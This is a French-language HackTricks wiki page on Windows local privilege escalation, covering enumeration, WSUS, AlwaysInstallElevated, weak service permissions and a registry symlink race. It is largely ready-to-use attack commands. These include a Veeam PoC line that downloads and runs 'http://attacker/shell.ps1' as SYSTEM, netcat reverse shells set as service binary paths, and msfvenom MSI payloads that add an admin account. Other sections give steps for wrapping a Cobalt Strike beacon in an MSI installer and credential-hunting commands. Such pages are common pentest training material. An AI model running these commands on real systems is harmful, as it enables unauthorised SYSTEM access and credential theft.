# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Meilleur outil pour rechercher les vecteurs d'élévation de privilèges locale sur Windows :** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Théorie initiale de Windows

### Access Tokens

**Si vous ne savez pas ce que sont les Windows Access Tokens, lisez la page suivante avant de continuer :**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Consultez la page suivante pour plus d'informations sur les ACLs - DACLs/SACLs/ACEs :**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Si vous ne savez pas ce que sont les integrity levels dans Windows, vous devriez lire la page suivante avant de continuer :**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Il existe différentes choses dans Windows qui pourraient **vous empêcher d'énumérer le système**, d'exécuter des binaires ou même de **détecter vos activités**. Vous devriez **lire** la **page** suivante et **énumérer** tous ces **mécanismes de défense** avant de commencer l'énumération d'élévation de privilèges :


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

Les processus UIAccess lancés via `RAiLaunchAdminProcess` peuvent être abusés pour atteindre High IL sans invites lorsque les vérifications secure-path d'AppInfo sont contournées. Consultez ici le workflow dédié de contournement UIAccess/Admin Protection :

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

La propagation du registre d'accessibilité Secure Desktop peut être abusée pour une écriture arbitraire dans le registre SYSTEM (RegPwn) :

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Les versions récentes de Windows ont également introduit un chemin LPE **SMB arbitrary-port** où une authentification locale NTLM privilégiée est reflétée via une connexion TCP SMB réutilisée :

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Vérifiez si la version de Windows présente une vulnérabilité connue (vérifiez aussi les correctifs appliqués).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Ce [site](https://msrc.microsoft.com/update-guide/vulnerability) est pratique pour rechercher des informations détaillées sur les vulnérabilités de sécurité Microsoft. Cette base de données contient plus de 4 700 vulnérabilités de sécurité, montrant la **surface d'attaque massive** qu'un environnement Windows présente.

**Sur le système**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**En local avec les informations système**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Dépôts Github d'exploits :**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Des informations d'identification / Juicy ont-elles été enregistrées dans les variables d'environnement ?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historique PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Fichiers PowerShell Transcript

Vous pouvez apprendre comment l’activer dans [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Journalisation des modules PowerShell

Les détails des exécutions du pipeline PowerShell sont enregistrés, incluant les commandes exécutées, les invocations de commandes et des parties de scripts. Cependant, les détails complets de l’exécution et les résultats de sortie peuvent ne pas être capturés.

Pour l’activer, suivez les instructions de la section "Transcript files" de la documentation, en choisissant **"Module Logging"** au lieu de **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Pour afficher les 15 derniers événements des logs PowerShell, vous pouvez exécuter :
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Un enregistrement complet de l’activité et du contenu intégral de l’exécution du script est capturé, garantissant que chaque bloc de code est documenté au fur et à mesure de son exécution. Ce processus conserve une trace d’audit complète de chaque activité, précieuse pour la forensic et l’analyse d’un comportement malveillant. En documentant toute l’activité au moment de l’exécution, il fournit des informations détaillées sur le processus.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Les événements de journalisation pour le Script Block peuvent être trouvés dans le Windows Event Viewer au chemin : **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Pour afficher les 20 derniers événements, vous pouvez utiliser :
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Paramètres Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Lecteurs
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Vous pouvez compromettre le système si les mises à jour ne sont pas demandées en utilisant http**S** mais http.

Vous commencez par vérifier si le réseau utilise une mise à jour WSUS non-SSL en exécutant ce qui suit dans cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ou ce qui suit en PowerShell :
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Si vous obtenez une réponse comme l’une de celles-ci :
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Et si `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ou `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` est égal à `1`.

Alors, **c’est exploitable.** Si la dernière clé de registre est égale à 0, alors l’entrée WSUS sera ignorée.

Afin d’exploiter cette vulnerabilities, vous pouvez utiliser des outils comme : [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Ce sont des scripts d’exploits weaponized MiTM pour injecter de fausses mises à jour dans le trafic WSUS non-SSL.

Lisez la recherche ici :

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lire le rapport complet ici**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Fondamentalement, c’est la faille que ce bug exploite :

> Si nous avons le pouvoir de modifier notre proxy utilisateur local, et que Windows Updates utilise le proxy configuré dans les paramètres d’Internet Explorer, nous avons donc le pouvoir d’exécuter [PyWSUS](https://github.com/GoSecure/pywsus) localement pour intercepter notre propre trafic et exécuter du code en tant qu’utilisateur élevé sur notre asset.
>
> De plus, puisque le service WSUS utilise les paramètres de l’utilisateur actuel, il utilisera également son magasin de certificats. Si nous générons un certificat auto-signé pour le hostname WSUS et ajoutons ce certificat dans le magasin de certificats de l’utilisateur actuel, nous serons en mesure d’intercepter à la fois le trafic WSUS HTTP et HTTPS. WSUS n’utilise aucun mécanisme de type HSTS pour implémenter une validation de type trust-on-first-use sur le certificat. Si le certificat présenté est approuvé par l’utilisateur et possède le bon hostname, il sera accepté par le service.

Vous pouvez exploiter cette vulnérabilité à l’aide de l’outil [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (une fois qu’il sera liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

De nombreux agents enterprise exposent une surface IPC localhost et un canal de mise à jour privilégié. Si l’enrôlement peut être contraint vers un serveur attaquant et que l’updater fait confiance à une racine CA rogue ou à des vérifications de signature faibles, un utilisateur local peut livrer un MSI malveillant que le service SYSTEM installe. Voir une technique généralisée (basée sur la chaîne Netskope stAgentSvc – CVE-2025-0309) ici :


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` expose un service localhost sur **TCP/9401** qui traite des messages contrôlés par l’attaquant, permettant d’exécuter des commandes arbitraires en tant que **NT AUTHORITY\SYSTEM**.

- **Recon** : confirmez le listener et la version, par ex. `netstat -ano | findstr 9401` et `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit** : placez un PoC tel que `VeeamHax.exe` avec les DLL Veeam requises dans le même répertoire, puis déclenchez un payload SYSTEM via le socket local :
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Le service exécute la commande en tant que SYSTEM.
## KrbRelayUp

Une vulnérabilité de **local privilege escalation** existe dans les environnements Windows **domain** dans certaines conditions spécifiques. Ces conditions incluent les environnements où le **LDAP signing** n’est pas imposé, où les utilisateurs possèdent des droits leur permettant de configurer le **Resource-Based Constrained Delegation (RBCD)**, et la capacité pour les utilisateurs de créer des ordinateurs au sein du domaine. Il est important de noter que ces **requirements** sont satisfaits avec les **paramètres par défaut**.

Trouvez l’**exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Pour plus d’informations sur le déroulement de l’attaque, consultez [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Si** ces 2 registers sont **enabled** (la valeur est **0x1**), alors des utilisateurs de n’importe quel privilège peuvent **install** (exécuter) des fichiers `*.msi` en tant que NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### payloads Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Si vous avez une session meterpreter, vous pouvez automatiser cette technique en utilisant le module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Utilisez la commande `Write-UserAddMSI` de power-up pour créer dans le répertoire courant un binaire MSI Windows afin d’élever les privilèges. Ce script génère un installateur MSI précompilé qui demande l’ajout d’un utilisateur/groupe (vous aurez donc besoin d’un accès GIU) :
```
Write-UserAddMSI
```
Just execute the created binary to escalate privileges.

### MSI Wrapper

Lisez ce tutoriel pour apprendre à créer un MSI wrapper avec cet outil. Notez que vous pouvez envelopper un fichier "**.bat**" si vous voulez **juste** **exécuter** des **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Ouvrez **Visual Studio**, sélectionnez **Create a new project** et tapez "installer" dans la zone de recherche. Sélectionnez le projet **Setup Wizard** et cliquez sur **Next**.
- Donnez au projet un nom, comme **AlwaysPrivesc**, utilisez **`C:\privesc`** pour l’emplacement, sélectionnez **place solution and project in the same directory**, et cliquez sur **Create**.
- Continuez à cliquer sur **Next** jusqu’à l’étape 3 sur 4 (choose files to include). Cliquez sur **Add** et sélectionnez le Beacon payload que vous venez de générer. Puis cliquez sur **Finish**.
- Mettez en surbrillance le projet **AlwaysPrivesc** dans **Solution Explorer** et, dans **Properties**, changez **TargetPlatform** de **x86** à **x64**.
- Il existe d’autres propriétés que vous pouvez modifier, comme **Author** et **Manufacturer**, qui peuvent rendre l’application installée plus légitime.
- Faites un clic droit sur le projet et sélectionnez **View > Custom Actions**.
- Faites un clic droit sur **Install** et sélectionnez **Add Custom Action**.
- Double-cliquez sur **Application Folder**, sélectionnez votre fichier **beacon.exe** et cliquez sur **OK**. Cela garantira que le beacon payload est exécuté dès que l’installateur est lancé.
- Sous **Custom Action Properties**, changez **Run64Bit** en **True**.
- Enfin, **build it**.
- Si l’avertissement `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` s’affiche, assurez-vous d’avoir défini la plateforme sur x64.

### MSI Installation

Pour exécuter l’**installation** du fichier `.msi` malveillant en **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Pour exploiter cette vulnérabilité, vous pouvez utiliser : _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

Ces paramètres décident de ce qui est **logged**, donc vous devez faire attention
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, est intéressant pour savoir où les logs sont envoyés
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** est conçu pour la **gestion des mots de passe de l’Administrateur local**, en garantissant que chaque mot de passe est **unique, aléatoire et régulièrement mis à jour** sur les ordinateurs joints à un domaine. Ces mots de passe sont stockés de manière sécurisée dans Active Directory et ne peuvent être consultés que par les utilisateurs auxquels des permissions suffisantes ont été accordées via des ACLs, leur permettant de voir les mots de passe de l’admin local s’ils sont autorisés.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Si actif, les **mots de passe en clair sont stockés dans LSASS** (Local Security Authority Subsystem Service).\
[**Plus d’infos sur WDigest dans cette page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Protection LSA

À partir de **Windows 8.1**, Microsoft a introduit une protection renforcée pour le Local Security Authority (LSA) afin de **bloquer** les tentatives des processus non fiables de **lire sa mémoire** ou d’y injecter du code, renforçant ainsi la sécurité du système.\
[**Plus d'informations sur la protection LSA ici**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credential Guard

**Credential Guard** a été introduit dans **Windows 10**. Son objectif est de protéger les credentials stockés sur un appareil contre des menaces comme les attaques pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Identifiants mis en cache

Les **identifiants de domaine** sont authentifiés par la **Local Security Authority** (LSA) et utilisés par les composants du système d'exploitation. Lorsqu les données de connexion d'un utilisateur sont authentifiées par un package de sécurité enregistré, les identifiants de domaine de l'utilisateur sont généralement établis.\
[**Plus d'informations sur les Cached Credentials ici**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Users & Groups

### Énumérer les Users & Groups

Vous devriez vérifier si l'un des groupes auxquels vous appartenez dispose de permissions intéressantes
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Groupes privilégiés

Si vous **appartenez à un groupe privilégié, vous pourriez être en mesure d’élever vos privilèges**. Apprenez-en plus sur les groupes privilégiés et sur la façon de les abuser pour élever des privilèges ici :


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulation des tokens

**Apprenez-en davantage** sur ce qu’est un **token** dans cette page : [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consultez la page suivante pour **en savoir plus sur des tokens intéressants** et sur la façon de les abuser :


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Utilisateurs connectés / Sessions
```bash
qwinsta
klist sessions
```
### Dossiers personnels
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Politique de mot de passe
```bash
net accounts
```
### Obtenir le contenu du clipboard
```bash
powershell -command "Get-Clipboard"
```
## Processus en cours

### Permissions des fichiers et des dossiers

Avant tout, en listant les processus, **vérifiez la présence de mots de passe dans la ligne de commande du processus**.\
Vérifiez si vous pouvez **écraser un binaire en cours d'exécution** ou si vous avez des permissions d'écriture sur le dossier du binaire afin d'exploiter d'éventuelles attaques [**DLL Hijacking**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Vérifiez toujours la présence éventuelle de [**electron/cef/chromium debuggers** en cours d'exécution, vous pourriez l'exploiter pour élever vos privilèges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Vérification des permissions des binaires des processus**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Vérification des permissions des dossiers des binaires des processus (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Extraction de mots de passe en mémoire

Vous pouvez créer un dump mémoire d'un processus en cours d'exécution à l'aide de **procdump** de sysinternals. Des services comme FTP ont les **identifiants en clair en mémoire**, essayez de dumper la mémoire et de lire les identifiants.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**Les applications s'exécutant en tant que SYSTEM peuvent permettre à un utilisateur de lancer un CMD, ou de parcourir des répertoires.**

Exemple : "Windows Help and Support" (Windows + F1), recherchez "command prompt", cliquez sur "Click to open Command Prompt"

## Services

Les Service Triggers permettent à Windows de démarrer un service lorsque certaines conditions se produisent (activité de named pipe/RPC endpoint, événements ETW, disponibilité IP, arrivée d'un périphérique, actualisation GPO, etc.). Même sans les droits SERVICE_START, vous pouvez souvent démarrer des services privilégiés en déclenchant leurs triggers. Voir les techniques d'énumération et d'activation ici :

-
{{#ref}}
service-triggers.md
{{#endref}}

Obtenir une liste des services :
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permissions

Vous pouvez utiliser **sc** pour obtenir des informations sur un service
```bash
sc qc <service_name>
```
Il est recommandé d'avoir le binaire **accesschk** de _Sysinternals_ pour vérifier le niveau de privilège requis pour chaque service.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Il est recommandé de vérifier si "Authenticated Users" peuvent modifier un service quelconque:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Vous pouvez télécharger accesschk.exe pour XP ici](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Activer le service

Si vous rencontrez cette erreur (par exemple avec SSDPSRV) :

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Vous pouvez l’activer en utilisant
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Prenez en compte que le service upnphost dépend de SSDPSRV pour fonctionner (pour XP SP1)**

**Une autre solution de contournement** de ce problème consiste à exécuter :
```
sc.exe config usosvc start= auto
```
### **Modifier le chemin du binaire du service**

Dans le scénario où le groupe "Authenticated users" possède **SERVICE_ALL_ACCESS** sur un service, il est possible de modifier le binaire exécutable du service. Pour modifier et exécuter **sc** :
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Redémarrer le service
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Des privilèges peuvent être élevés via विभिन्न permissions :

- **SERVICE_CHANGE_CONFIG** : Permet la reconfiguration du binaire du service.
- **WRITE_DAC** : Autorise la reconfiguration des permissions, ce qui permet de modifier les configurations du service.
- **WRITE_OWNER** : Permet de prendre la propriété et de reconfigurer les permissions.
- **GENERIC_WRITE** : Hérite de la capacité à modifier les configurations du service.
- **GENERIC_ALL** : Hérite aussi de la capacité à modifier les configurations du service.

Pour la détection et l’exploitation de cette vulnérabilité, l'_exploit/windows/local/service_permissions_ peut être utilisé.

### Services binaries weak permissions

Si un service s’exécute en tant que **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ou sous un compte de domaine privilégié, mais que des **utilisateurs à faibles privilèges peuvent modifier le EXE du service ou son dossier parent**, le service peut souvent être détourné en **remplaçant le binaire puis en redémarrant le service**.

**Vérifiez si vous pouvez modifier le binaire exécuté par un service** ou si vous avez des **droits d’écriture sur le dossier** où le binaire est situé ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Vous pouvez lister chaque binaire exécuté par un service avec **wmic** (pas dans system32) et vérifier vos permissions avec **icacls** :
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Vous pouvez également utiliser **sc** et **icacls** :
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Recherchez des ACL dangereuses accordées à **`Everyone`**, **`BUILTIN\Users`** ou **`Authenticated Users`**, en particulier **`(F)`**, **`(M)`** ou **`(W)`** sur l'exécutable du service ou sur le répertoire qui le contient. Un flux d'abus pratique est :

1. Confirmer le compte du service et le chemin de l'exécutable avec `sc qc <service_name>`.
2. Confirmer que le binaire est inscriptible avec `icacls <path>`.
3. Remplacer le binaire du service par un payload ou un binaire de service malveillant valide.
4. Redémarrer le service avec `sc stop <service_name> && sc start <service_name>` (ou attendre un reboot / service trigger).

Vérifications automatisées utiles :
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Si le service n'autorise pas un utilisateur normal à le redémarrer, vérifiez s'il démarre automatiquement au boot, s'il a une action de défaillance qui le relance, ou s'il peut être déclenché indirectement par l'application qui l'utilise.

### Services registry modify permissions

You should check if you can modify any service registry.\
You can **check** your **permissions** over a service **registry** doing:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Il faut vérifier si **Authenticated Users** ou **NT AUTHORITY\INTERACTIVE** disposent des permissions `FullControl`. Si c'est le cas, le binaire exécuté par le service peut être modifié.

Pour changer le Path du binaire exécuté :
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Course de symlink du Registre pour un write arbitraire de valeur HKLM (ATConfig)

Certaines fonctionnalités d’accessibilité Windows créent des clés **ATConfig** par utilisateur, qui sont ensuite copiées par un processus **SYSTEM** dans une clé de session HKLM. Une **race de symbolic link** du Registre peut rediriger cette écriture privilégiée vers **n’importe quel chemin HKLM**, donnant une primitive de **write de valeur** arbitraire sur HKLM.

Emplacements clés (exemple : On-Screen Keyboard `osk`) :

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` liste les fonctionnalités d’accessibilité installées.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stocke la configuration contrôlée par l’utilisateur.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` est créée pendant les transitions de logon/secure-desktop et est inscriptible par l’utilisateur.

Flux d’abus (CVE-2026-24291 / ATConfig) :

1. Remplissez la valeur **HKCU ATConfig** que vous voulez voir écrite par SYSTEM.
2. Déclenchez la copie du secure-desktop (par ex., **LockWorkstation**), qui lance le flux AT broker.
3. **Gagnez la race** en plaçant un **oplock** sur `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; quand l’oplock se déclenche, remplacez la clé **HKLM Session ATConfig** par un **registry link** vers une cible HKLM protégée.
4. SYSTEM écrit la valeur choisie par l’attaquant dans le chemin HKLM redirigé.

Une fois que vous avez un write arbitraire de valeur HKLM, pivotez vers LPE en écrasant des valeurs de configuration de service :

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Choisissez un service qu’un utilisateur normal peut démarrer (par ex., **`msiserver`**) et déclenchez-le après l’écriture. **Note :** l’implémentation publique de l’exploit **locke le workstation** dans le cadre de la race.

Exemple d’outillage (RegPwn BOF / standalone) :
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Autorisations AppendData/AddSubdirectory du registre des services

Si vous avez cette autorisation sur un registre, cela signifie que **vous pouvez créer des sous-registres à partir de celui-ci**. Dans le cas des services Windows, cela suffit pour exécuter du code arbitraire :


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

